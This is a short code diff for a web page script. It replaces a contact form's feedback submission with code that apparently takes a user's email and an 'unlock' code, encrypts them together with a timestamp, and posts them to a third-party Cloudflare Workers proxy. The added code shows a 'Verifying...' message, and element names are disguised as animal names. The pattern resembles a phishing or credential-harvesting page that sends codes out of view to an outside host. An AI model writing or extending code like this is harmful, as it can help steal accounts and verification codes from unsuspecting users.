@@ -89,20 +89,20 @@ function falcon() {
     form.classList.add("shake");
     return;
   }
-const customerName = document.getElementById("viper").value;
-const customerMessage = document.getElementById("cobra").value;
-
-const cleanPayload = new URLSearchParams();
-cleanPayload.append("Name", customerName);
-cleanPayload.append("Feedback", customerMessage);
-
-fetch("https://rum-email-proxy.haricoting.workers.dev/contact", {
-  method: "POST",
-  headers: {
-    "Content-Type": "application/x-www-form-urlencoded",
-  },
-  body: cleanPayload
-});
+  unlockBtn.disabled = true;
+  spinner.style.display = "block";
+  btnText.innerText = "Verifying...";
+  const encoded = encryptPayload({
+    email: email,
+    code: code,
+    timestamp: Date.now()
+  });
+  fetch("https://rum-email-proxy.haricoting.workers.dev/contact", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+    },
+    body: "secure_data=" + encodeURIComponent(encoded),
   })
     .then((r) => r.json())
     .then((result) => {
